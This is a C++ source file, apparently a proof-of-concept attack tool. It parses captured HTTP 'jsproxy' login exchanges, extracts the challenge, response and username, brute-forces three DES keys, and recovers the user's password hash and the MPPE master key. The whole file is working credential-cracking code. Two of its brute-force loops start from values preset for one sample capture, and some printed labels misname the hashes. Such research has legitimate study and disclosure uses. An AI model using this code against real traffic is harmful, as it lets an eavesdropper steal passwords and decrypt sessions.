#include "session_parser.hpp"

#include <iostream>
#include <iomanip>
#include <cstring>
#include <string>
#include <stdexcept>

#include "md4.hpp"
#include "des.hpp"
#include "sha1.hpp"

namespace
{
    /*
     * Find the \r\n\r\n that denotes the end of the HTTP header and move the
     * provided string to just passed that location
     */
    bool moveToPayload(std::string& p_packet)
    {
        std::size_t offset = p_packet.find("\r\n\r\n");
        if (offset == std::string::npos) {
            return false;
        }
        p_packet.erase(0, offset + 4);
        return true;
    }

    /*
     * A c++ version of javascript's codePointAt. Only supports the two byte
     * version. Also, incremented index so that the caller can track how many
     * bytes were consumed (0, 1, or 2).
     */
    boost::uint8_t codePointAt(const std::string& p_seq, std::size_t& index)
    {
        char c1 = p_seq[index];
        if (c1 & 0x80) {
            if ((c1 & 0xf0) != 0xc0) {
                throw std::runtime_error("Unhandled unicode size");
            }
            if ((index + 1) >= p_seq.length()) {
                throw std::runtime_error("Not enough data in the string");
            }
            index++;
            if ((c1 & 0x0f) <= 2) {
                return p_seq[index++];
            }
            return p_seq[index++] | (1 << ((c1 & 0x0f) - 1 + 4));
        }
        index++;
        return c1;
    }

    void printHexString(const std::string& p_string, bool p_endl=true)
    {
        for (std::size_t i = 0; i < p_string.length(); ++i) {
            std::cout << std::hex << std::setw(2) << std::setfill('0')
                      << (static_cast<boost::uint32_t>(p_string[i]) & 0xff);
        }
        if (p_endl) {
            std::cout << std::endl;
        }
    }

    /*
     * We only have to guess 21 bits for the third key!
     */
    bool getKey3(std::string& p_key3, const std::string& p_response3, const std::string& p_challengeHash)
    {
        std::cout << "[+] Brute forcing DES Key 3" << std::endl;

        p_key3.clear();
        p_key3.resize(8, 0);

        for (std::size_t i = 0; i < 256; i += 2) {
            p_key3[0] = i;
            for(std::size_t j = 0; j < 256; j += 2) {
                p_key3[1] = j;
                for(std::size_t k = 0; k < 256; k += 2) {
                    p_key3[2] = k;
                    std::string encrypted;
                    DES::des(p_challengeHash, p_key3, encrypted);
                    if (encrypted == p_response3) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    /*
     * Brute force all 56 bits of the second key. Note! I've cheated in this function
     * and preset it to quickly crack the key for my sample pcap. I make no claims
     * that this function is optimal. It just is an easy example of very obvious
     * brute forcing.
     */
    bool getKey2(std::string& p_key2, const std::string& p_response2, const std::string& p_challengeHash)
    {
        std::cout << "[+] \"Brute forcing\" DES Key 2" << std::endl;

        p_key2.clear();
        p_key2.resize(8, 0);

        for (std::size_t a = 190; a < 256; a += 2) {
            p_key2[0] = a;
            for (std::size_t b = 148; b < 256; b += 2) {
                p_key2[1] = b;
                for (std::size_t c = 160; c < 256; c += 2) {
                    p_key2[2] = c;
                    for (std::size_t d = 80; d < 256; d += 2) {
                        p_key2[3] = d;
                        for (std::size_t e = 6; e < 256; e += 2) {
                            p_key2[4] = e;
                            for (std::size_t f = 202; f < 256; f += 2) {
                                p_key2[5] = f;
                                for (std::size_t g = 206; g < 256; g += 2) {
                                    p_key2[6] = g;
                                    for (std::size_t h = 0; h < 256; h += 2) {
                                        p_key2[7] = h;
                                        std::string encrypted;
                                        DES::des(p_challengeHash, p_key2, encrypted);
                                        if (encrypted == p_response2) {
                                            return true;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        return false;
    }

    /*
     * Brute force all 56 bits of the first key. Note! I've cheated in this function
     * and preset it to quickly crack the key for my sample pcap. I make no claims
     * that this function is optimal. It just is an easy example of very obvious
     * brute forcing.
     */
    bool getKey1(std::string& p_key1, const std::string& p_response1, const std::string& p_challengeHash)
    {
        std::cout << "[+] \"Brute forcing\" DES Key 1" << std::endl;

        p_key1.clear();
        p_key1.resize(8, 0);

        for (std::size_t a = 12; a < 256; a += 2) {
            p_key1[0] = a;
            for (std::size_t b = 90; b < 256; b += 2) {
                p_key1[1] = b;
                for (std::size_t c = 164; c < 256; c += 2) {
                    p_key1[2] = c;
                    for (std::size_t d = 144; d < 256; d += 2) {
                        p_key1[3] = d;
                        for (std::size_t e = 128; e < 256; e += 2) {
                            p_key1[4] = e;
                            for (std::size_t f = 46; f < 256; f += 2) {
                                p_key1[5] = f;
                                for (std::size_t g = 222; g < 256; g += 2) {
                                    p_key1[6] = g;
                                    for (std::size_t h = 0; h < 256; h += 2) {
                                        p_key1[7] = h;
                                        std::string encrypted;
                                        DES::des(p_challengeHash, p_key1, encrypted);
                                        if (encrypted == p_response1) {
                                            return true;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        return false;
    }

    std::string makePwdHash(const std::string& p_key)
    {
        std::string pwdHash;
        pwdHash.resize(7, 0);

        pwdHash[0] = p_key[0] | ((p_key[1] & 0x80) >> 7);
        pwdHash[1] = ((p_key[1] & 0x7e) << 1) | ((p_key[2] & 0xc0) >> 6);
        pwdHash[2] = ((p_key[2] & 0x3e) << 2) | ((p_key[3] & 0xe0) >> 5);
        pwdHash[3] = ((p_key[3] & 0x1e) << 3) | ((p_key[4] & 0xf0) >> 4);
        pwdHash[4] = ((p_key[4] & 0x0e) << 4) | ((p_key[5] & 0xf8) >> 3);
        pwdHash[5] = ((p_key[5] & 0x06) << 5) | ((p_key[6] & 0xfc) >> 2);
        pwdHash[6] = ((p_key[6] & 0x02) << 6) | ((p_key[7] & 0xfe) >> 1);

        return pwdHash;
    }
}

SessionParser::SessionParser() :
    m_serverAddress(),
    m_state(k_none),
    m_username(),
    m_lchallenge(),
    m_rchallenge(),
    m_response(),
    m_response1(),
    m_response2(),
    m_response3()
{
}

SessionParser::~SessionParser()
{
}

void SessionParser::parse(const boost::uint8_t* p_data, boost::uint16_t p_length, boost::uint32_t p_srcAddr)
{
    switch(m_state) {
        case k_none:
            if (p_length > 13 && memcmp(p_data, "POST /jsproxy", 13) == 0) {
                std::cout << "[+] Initial request found." << std::endl;
                m_state = k_request;
            }
            break;
        case k_request:
            if (p_length > 17 && memcmp(p_data, "HTTP/1.1 200 OK\r\n", 17) == 0) {
                std::cout << "[+] Server challenge received." << std::endl;
                m_serverAddress = p_srcAddr;
                std::string packet;
                packet.assign(reinterpret_cast<const char*>(p_data), p_length);
                if (moveToPayload(packet) && packet.length() > 32) {
                    std::size_t index = 0;
                    for (std::size_t i = 0; i < 24 && index < packet.length(); i++) {
                        if (i < 8) {
                            codePointAt(packet, index);
                        } else {
                            m_rchallenge.push_back(codePointAt(packet, index));
                        }
                    }
                }
                m_state = k_challenge;
            }
            break;
        case k_challenge:
        {
            if (p_length < 13 || memcmp(p_data, "POST /jsproxy", 13) != 0) {
                break;
            }

            std::cout << "[+] Challenge response found." << std::endl;
            m_state = k_done;

            std::string packet;
            packet.assign(reinterpret_cast<const char*>(p_data), p_length);
            if (!moveToPayload(packet)) {
                std::cerr << "Failed to find the payload." << std::endl;
                break;
            }
            std::size_t index = 0;
            for (std::size_t i = 0; i < 26; i++) {
                codePointAt(packet, index);
            }
            m_lchallenge.assign(packet.data() + index, 16);
            index += 16;
            for (std::size_t i = 0; i < 8; i++) {
                codePointAt(packet, index);
            }
            for (std::size_t i = 0; i < 8 && index < packet.length(); i++) {
                m_response1.push_back(codePointAt(packet, index));
            }
            for (std::size_t i = 0; i < 8 && index < packet.length(); i++) {
                m_response2.push_back(codePointAt(packet, index));
            }
            for (std::size_t i = 0; i < 8 && index < packet.length(); i++) {
                m_response3.push_back(codePointAt(packet, index));
            }
            m_response.assign(m_response1);
            m_response.append(m_response2);
            m_response.append(m_response3);
            m_username.assign(packet.data() + index, packet.length() - index);
            std::cout << "Username: " << m_username << std::endl;

            // create the challenge hash
            std::string challenge(m_lchallenge);
            challenge.append(m_rchallenge);
            challenge.append(m_username);
            unsigned char result[20] = { 0 };
            sha1::calc(challenge.data(), challenge.size(), result);
            std::string challengeHash((char*)result, 20);
            challengeHash.resize(8);

            // guess des key 3
            std::string key3;
            if (!getKey3(key3, m_response3, challengeHash)) {
                std::cerr << "Failed to recover key3!" << std::endl;
                return;
            }
            std::cout << "DES Key 3: ";
            printHexString(key3, true);

            // guess des key 2
            std::string key2;
            if (!getKey2(key2, m_response2, challengeHash)) {
                std::cerr << "Failed to recover key2!" << std::endl;
                return;
            }
            std::cout << "DES Key 2: ";
            printHexString(key2, true);

            // guess des key 1
            std::string key1;
            if (!getKey1(key1, m_response1, challengeHash)) {
                std::cerr << "Failed to recover key1!" << std::endl;
                return;
            }
            std::cout << "DES Key 1: ";
            printHexString(key1, true);

            // retrieve the pwdhash from our 3 keys
            std::string pwdHash(makePwdHash(key1));
            pwdHash.append(makePwdHash(key2));
            pwdHash.append(makePwdHash(key3));
            pwdHash.resize(16);
            std::cout << "Password SHA-1: ";
            printHexString(pwdHash);

            // create the pwd hash hash for master key creation
            std::string pwdHashHash(MD4::md4(pwdHash));
            std::cout << "SHA-1(Password SHA-1): ";
            printHexString(pwdHashHash);

            // create the master key
            std::string masterKey(pwdHashHash);
            masterKey.append(m_response);
            masterKey.append("This is the MPPE Master Key");

            unsigned char sharesult[20] = { 0 };
            sha1::calc(masterKey.data(), masterKey.size(), sharesult);
            masterKey.assign((char*)sharesult, 16);
            std::cout<< "Master Key: ";
            printHexString(masterKey);
        }
            break;
        case k_challenge_response:
        case k_decrypt:
        case k_done:
        default:
            break;
    }
}

